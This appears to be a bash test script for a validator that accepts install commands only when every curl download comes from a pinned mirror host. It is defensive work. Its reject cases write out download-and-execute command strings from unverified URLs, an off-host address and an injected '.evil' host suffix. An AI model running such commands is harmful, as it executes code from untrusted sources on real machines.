#!/usr/bin/env bash
# Post-merge P2: every curl source must be independently pinned.
# Hermetic command strings only: no network fetch or execution.
set -euo pipefail
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$ROOT/scripts/lib/client_mirror_gates.sh"
A='http://192.0.2.10'
B='http://192.0.2.20'
assert_reject() {
  local label="$1" command_text="$2" result
  if result="$(client_assert_command_mirror_base "$command_text" "$A" 2>&1)"; then
    printf 'FAIL %s: %s\n' "$label" "$result" >&2
    exit 1
  fi
  printf 'PASS REJECT %s\n' "$label"
}
assert_accept() {
  local label="$1" command_text="$2" result
  if ! result="$(client_assert_command_mirror_base "$command_text" "$A" 2>&1)"; then
    printf 'FAIL %s: %s\n' "$label" "$result" >&2
    exit 1
  fi
  printf 'PASS ACCEPT %s\n' "$label"
}
assert_reject 'incidental echo cannot pin curl variable' \
  "echo $A/client/expected.sh; curl -o x.sh \"\$UNVERIFIED_URL\"; bash x.sh --mirror-base $A"
assert_reject 'second curl origin independently verified' \
  "curl -fsSLo x.sh $A/client/x.sh && curl -fsSLo y.sh \"\$UNKNOWN\" && bash x.sh --mirror-base $A"
assert_reject 'curl --url unverified' \
  "echo $A/client/expected.sh; curl --url \"\$UNVERIFIED_URL\" -o x.sh; bash x.sh --mirror-base $A"
assert_reject 'off-host curl source with incidental expected URL' \
  "echo $A/client/x.sh; curl -fsSLo x.sh $B/client/x.sh && bash x.sh --mirror-base $A"
assert_reject 'URL-variable host suffix injection' \
  "U='$A'; curl -fsSLo x.sh \"\$U.evil/client/x.sh\" && bash x.sh --mirror-base $A"
assert_accept 'Menu 7 variable URL and filename' \
  "U='$A'; F='x.sh'; D='x.sh.download'; curl -fsSLo \"\$D\" \"\$U/client/\$F\" && bash x.sh --mirror-base $A"
assert_accept 'direct pinned URL' \
  "curl -fsSLo x.sh $A/client/x.sh && bash x.sh --mirror-base $A"
assert_accept 'local execution with runtime pin' \
  "bash x.sh --mirror-base $A"
assert_accept 'braced pinned variable URL' \
  "U='$A'; curl -fsSLo x.sh \"\${U}/client/x.sh\" && bash x.sh --mirror-base $A"
assert_accept 'explicit curl --url pinned literal' \
  "curl --url $A/client/x.sh -o x.sh && bash x.sh --mirror-base $A"
assert_reject 'curl config file cannot inject unknown source' \
  "echo $A/client/x.sh; curl -K config.txt && bash x.sh --mirror-base $A"
# Source-time absolute lookup of helper remains valid when the caller changes cwd.
( cd /tmp; assert_accept 'sourced library stable after cd' \
  "curl -fsSLo x.sh $A/client/x.sh && bash x.sh --mirror-base $A" )
echo 'POSTMERGE_HOSTPIN_SOURCE=PASS'
